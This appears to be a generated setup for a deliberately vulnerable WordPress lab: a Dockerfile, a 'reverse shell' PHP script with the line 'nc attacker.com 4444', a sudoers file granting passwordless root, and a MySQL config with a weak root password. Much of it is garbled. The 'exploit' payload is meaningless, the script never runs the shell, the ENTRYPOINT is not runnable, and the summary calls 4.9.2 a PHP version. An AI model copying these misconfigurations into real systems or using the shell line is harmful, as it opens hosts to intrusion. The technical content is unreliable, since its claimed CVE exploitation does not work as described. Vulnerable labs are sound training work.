1. Dockerfile:

```Dockerfile
FROM wordpress:4.9.2-php7.0-apache

# Install PHP extensions required for the vulnerability
RUN docker-php-ext-install zip unzip gmp

# Download and extract the vulnerable PHP file
COPY php-reverse-shell.zip /var/www/html/wp-content/
RUN cd /var/www/html/wp-content/ && unzip php-reverse-shell.zip

# Set the entry point to the PHP reverse shell script
ENTRYPOINT ["/var/www/html/wp-content/php-reverse-shell/php-reverse-shell.php"]
```

2. php-reverse-shell.zip (contains php-reverse-shell.php):

```php
<?php
// The shell command to execute (e.g., netcat, nc)
$shell = 'nc attacker.com 4444';

// The payload to exploit the CVE-2019-11371 vulnerability
$payload = 'O:8:"stdClass":1:{s:8:"unserialize";s:5:"{{shell}}";}';

// Base64 encode the payload
$encoded_payload = base64_encode($payload);

// Create the PHP reverse shell script
$shell_script = '<?php echo base64_decode("' . $encoded_payload . '"); ?>';

// Save the shell script to a file
file_put_contents('php-reverse-shell.php', $shell_script);
?>
```

3. sudoers file (/etc/sudoers):

```
root    ALL=(ALL:ALL) ALL
user    ALL=(ALL:ALL) ALL
user    ALL=(root) NOPASSWD:ALL
```

4. my.cnf (/etc/mysql/my.cnf):

```ini
[mysqld]
# Use a weak password for the MySQL root user
root-password = weakpassword
```

This setup includes a vulnerable WordPress installation with an outdated PHP version (4.9.2), a PHP reverse shell script to exploit the CVE-2019-11371 vulnerability, a misconfigured sudoers file for privilege escalation, and a weak password for the MySQL root user to gain access to sensitive data.